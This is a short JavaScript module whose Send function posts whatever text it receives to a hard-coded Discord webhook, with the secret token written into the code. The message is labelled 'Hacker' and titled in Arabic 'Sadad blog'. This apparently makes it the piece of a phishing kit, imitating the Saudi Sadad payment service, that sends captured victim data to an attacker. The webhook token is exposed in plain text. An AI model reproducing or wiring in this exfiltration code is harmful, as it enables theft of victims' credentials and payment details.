import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323085683140722792/J-u17wEG99mqRwtWemJi_kZWxohj8Ps5ODo4fLmaVv13_cfZXAjjRn9InjzUhIEiqVGN",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
